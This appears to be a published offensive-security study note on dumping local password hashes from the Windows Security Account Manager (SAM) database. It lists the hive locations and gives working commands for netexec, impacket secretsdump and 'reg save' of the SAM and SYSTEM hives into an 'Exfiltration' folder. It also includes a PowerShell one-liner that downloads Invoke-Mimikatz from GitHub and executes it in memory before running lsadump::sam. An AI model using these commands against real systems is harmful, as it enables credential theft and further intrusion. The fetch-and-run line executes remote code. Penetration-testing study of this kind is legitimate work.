---
{"dg-publish":true,"permalink":"/attack-computer/attack-windows/1-windows-basic/windows-authentication-system/security-account-manager-local/","noteIcon":"","created":"2025-04-15T14:11:19.617-04:00"}
---





### 1.2 Security Account Manager

The [Security Account Manager (SAM)](https://en.wikipedia.org/wiki/Security_Account_Manager) is a database file that stores users' passwords. Typically, SAM is used for local accounts, and enumerating it requires SYSTEM-level access.

According to [MITRE](https://attack.mitre.org/techniques/T1003/002/), SAM is typically used for local accounts.

Normally the SAM databases are stored in following.
```bash
%systemroot%\system32\config\sam   #main
%systemroot%\repair\sam._          #backup
```

#### 1.2.1 netexec
```bash
netexec smb <IP> -u <User> -p <Password> --sam --local-auth
```

#### 1.2.2 Secretsdump
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
or
impacket-secretsdump
```

#### 1.2.3 Windows
```bash
reg save HKLM\SAM c:\Exfiltration\SAM
reg save HKLM\SYSTEM c:\Exfiltration\SYSTEM
```

#### 1.2.4 Mimikatz
```bash
# Load into memory
IEX (IWR -UseBasicParsing "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")

# Dump from SAM and SYSTEM. Ensure files are in the current working directory
Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"

# Dump against the live hive files
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

---
